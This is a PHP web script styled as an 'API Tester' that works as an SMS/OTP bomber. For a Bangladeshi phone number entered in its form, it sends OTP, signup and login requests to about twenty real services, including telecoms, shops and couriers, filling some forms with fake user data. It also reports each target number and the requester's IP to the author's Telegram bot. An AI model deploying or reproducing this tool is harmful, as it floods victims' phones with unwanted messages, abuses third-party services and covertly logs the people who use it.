<?php
// Get environment variables (for Vercel)
$telegramBotToken = getenv('TELEGRAM_BOT_TOKEN');
$telegramChatId = getenv('TELEGRAM_CHAT_ID');

// Function to send message to Telegram
function sendTelegramMessage($message, $botToken, $chatId) {
    if (!$botToken || !$chatId) return false;
    
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

// Function to send POST requests
function sendPostRequest($url, $data, $headers = []) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge(['Content-Type: application/json'], $headers));
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return [
        'http_code' => $httpCode,
        'response' => $response
    ];
}

// Function to send GET requests
function sendGetRequest($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return [
        'http_code' => $httpCode,
        'response' => $response
    ];
}

// Get client IP
function getClientIP() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        return $_SERVER['HTTP_X_REAL_IP'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

if (isset($_GET['number'])) {
    $number = $_GET['number'];
    $clientIP = getClientIP();
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $cleanNumber = ltrim($number, '0');
    $fullNumber = '880' . $cleanNumber;
    
    $results = [
        'status' => 'processing',
        'phone_number' => $number,
        'total_apis' => 0,
        'successful' => 0,
        'failed' => 0,
        'credit' => 'Ronju Vai',
        'channel' => 'ronjumodz',
        'timestamp' => date('Y-m-d H:i:s')
    ];

    // GET-based APIs
    $getAPIs = [
        "Bikroy" => "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$number",
        "Rokomari" => "https://www.rokomari.com/otp/send?emailOrPhone=$fullNumber&countryCode=BD",
        "eCourier" => "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=$number",
        "Fundesh" => "https://fundesh.com.bd/api/auth/generateOTP?service_key=&msisdn=$cleanNumber",
        "UltraNet" => "https://ultranetrn.com.br/fonts/api.php?number=$number",
        "Sundarban_SendPin" => "https://tracking.sundarbancourierltd.com/PreBooking/SendPin?PreBookingRegistrationPhoneNumber=$number",
        "Sundarban_CheckUsername" => "https://tracking.sundarbancourierltd.com/PreBooking/CheckingUsername?PreBookingRegistrationUsername=$number",
        "Tera_1024" => "https://www.1024tera.com/wap/outlogin/phoneRegister?selectStatus=true&redirectUrl=https://www.1024tera.com/wap/share/filelist&phone=$number"
    ];

    // POST-based APIs
    $postAPIs = [
        "CokeStudio_Store_OTP" => [
            'url' => 'https://cokestudio23.sslwireless.com/api/store-and-send-otp',
            'data' => [
                "msisdn" => $fullNumber,
                "name" => "Test User",
                "email" => "test@example.com",
                "dob" => "2000-01-01",
                "occupation" => "N/A",
                "gender" => "male"
            ]
        ],
        "CokeStudio_Check_GP" => [
            'url' => 'https://cokestudio23.sslwireless.com/api/check-gp-number',
            'data' => [
                "msisdn" => $number
            ]
        ],
        "Grameenphone_OTP" => [
            'url' => 'https://weblogin.grameenphone.com/backend/api/v1/otp',
            'data' => [
                "msisdn" => $number
            ]
        ],
        "RabbitHole_OTP" => [
            'url' => 'https://apix.rabbitholebd.com/appv2/login/requestOTP',
            'data' => [
                "mobile" => "+" . $fullNumber
            ]
        ],
        "Osudpotro_OTP" => [
            'url' => 'https://api.osudpotro.com/api/v1/users/send_otp',
            'data' => [
                "mobile" => "+88-" . $number,
                "deviceToken" => "web",
                "language" => "en",
                "os" => "web"
            ]
        ],
        "Swap_OTP" => [
            'url' => 'https://api.swap.com.bd/api/v1/send-otp',
            'data' => [
                "phone" => $number
            ]
        ],
        "Airtel_Login_OTP" => [
            'url' => 'https://api.bd.airtel.com/v1/account/login/otp',
            'data' => [
                "phone_number" => $number
            ]
        ],
        "Airtel_Register_OTP" => [
            'url' => 'https://api.bd.airtel.com/v1/account/register/otp',
            'data' => [
                "phone_number" => $number
            ]
        ],
        "Prothom_Alo_Signup" => [
            'url' => 'https://prod-api.viewlift.com/identity/signup?site=prothomalo',
            'data' => [
                "requestType" => "send",
                "phoneNumber" => "+" . $fullNumber,
                "emailConsent" => true,
                "whatsappConsent" => false
            ]
        ],
        "Hoichoi_Signup" => [
            'url' => 'https://prod-api.viewlift.com/identity/signup?site=hoichoitv',
            'data' => [
                "requestType" => "send",
                "phoneNumber" => "+" . $fullNumber,
                "emailConsent" => true,
                "whatsappConsent" => true
            ]
        ],
        "Paperfly_Registration" => [
            'url' => 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
            'data' => [
                "full_name" => "Test User",
                "company_name" => "Test Company",
                "email_address" => "test@example.com",
                "phone_number" => $number
            ]
        ],
        "EonBazar_Register" => [
            'url' => 'https://app.eonbazar.com/api/auth/register',
            'data' => [
                "mobile" => $number,
                "name" => "Test User",
                "password" => "test123",
                "email" => "test@example.com"
            ]
        ]
    ];

    $results['total_apis'] = count($getAPIs) + count($postAPIs);

    // Process GET APIs (hidden from output)
    foreach ($getAPIs as $name => $url) {
        $result = sendGetRequest($url);
        $status = ($result['http_code'] == 200) ? 'success' : 'failed';
        
        if ($status == 'success') {
            $results['successful']++;
        } else {
            $results['failed']++;
        }
        
        usleep(300000); // 0.3 second delay
    }

    // Process POST APIs (hidden from output)
    foreach ($postAPIs as $name => $api) {
        $result = sendPostRequest($api['url'], $api['data']);
        $status = ($result['http_code'] == 200) ? 'success' : 'failed';
        
        if ($status == 'success') {
            $results['successful']++;
        } else {
            $results['failed']++;
        }
        
        usleep(300000); // 0.3 second delay
    }

    $results['status'] = 'completed';
    
    // Send Telegram notification
    $telegramMessage = "🚀 <b>New API Request</b>\n";
    $telegramMessage .= "📱 <b>Number:</b> $number\n";
    $telegramMessage .= "📊 <b>Results:</b> {$results['successful']}/{$results['total_apis']} Successful\n";
    $telegramMessage .= "🌐 <b>IP:</b> $clientIP\n";
    $telegramMessage .= "🕒 <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
    $telegramMessage .= "🔗 <b>Channel:</b> @ronjumodz";
    
    sendTelegramMessage($telegramMessage, $telegramBotToken, $telegramChatId);
    
    // Output only the required JSON
    header('Content-Type: application/json');
    echo json_encode($results, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);

} else {
    // HTML Form for browser access
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>API Tester - Ronju Vai</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }
            .container {
                background: white;
                border-radius: 20px;
                box-shadow: 0 15px 35px rgba(0,0,0,0.1);
                padding: 40px;
                max-width: 500px;
                width: 100%;
                text-align: center;
            }
            .logo {
                font-size: 2.5em;
                font-weight: bold;
                background: linear-gradient(135deg, #667eea, #764ba2);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin-bottom: 10px;
            }
            .channel {
                color: #666;
                margin-bottom: 30px;
                font-size: 1.1em;
            }
            .form-group {
                margin-bottom: 25px;
                text-align: left;
            }
            label {
                display: block;
                margin-bottom: 8px;
                font-weight: 600;
                color: #333;
            }
            input[type="text"] {
                width: 100%;
                padding: 15px;
                border: 2px solid #e1e5e9;
                border-radius: 12px;
                font-size: 16px;
                transition: all 0.3s ease;
            }
            input[type="text"]:focus {
                outline: none;
                border-color: #667eea;
                box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
            }
            .btn {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border: none;
                padding: 15px 30px;
                border-radius: 12px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: transform 0.2s ease;
                width: 100%;
            }
            .btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
            }
            .example {
                margin-top: 15px;
                color: #666;
                font-size: 14px;
            }
            .credit {
                margin-top: 30px;
                padding-top: 20px;
                border-top: 1px solid #e1e5e9;
                color: #888;
                font-size: 14px;
            }
            .stats {
                margin-top: 20px;
                padding: 15px;
                background: #f8f9fa;
                border-radius: 10px;
                border-left: 4px solid #667eea;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">⚡ API TESTER</div>
            <div class="channel">Powered by @ronjumodz</div>
            
            <form method="GET">
                <div class="form-group">
                    <label for="number">📱 Enter Phone Number:</label>
                    <input type="text" id="number" name="number" value="01712345678" required 
                           placeholder="Without +88 or 0">
                </div>
                <button type="submit" class="btn">🚀 Test All APIs</button>
            </form>
            
            <div class="example">
                <strong>Example:</strong> 01712345678, 01812345678, etc.
            </div>
            
            <div class="stats">
                <strong>📊 Features:</strong><br>
                • 20+ APIs Tested<br>
                • Instant Results<br>
                • Telegram Notifications<br>
                • Secure & Fast
            </div>
            
            <div class="credit">
                Created by <strong>Ronju Vai</strong> | Channel: <strong>@ronjumodz</strong>
            </div>
        </div>
        
        <script>
            // Add some interactivity
            document.querySelector("form").addEventListener("submit", function() {
                const btn = this.querySelector(".btn");
                btn.innerHTML = "⏳ Processing...";
                btn.disabled = true;
            });
        </script>
    </body>
    </html>';
}
?>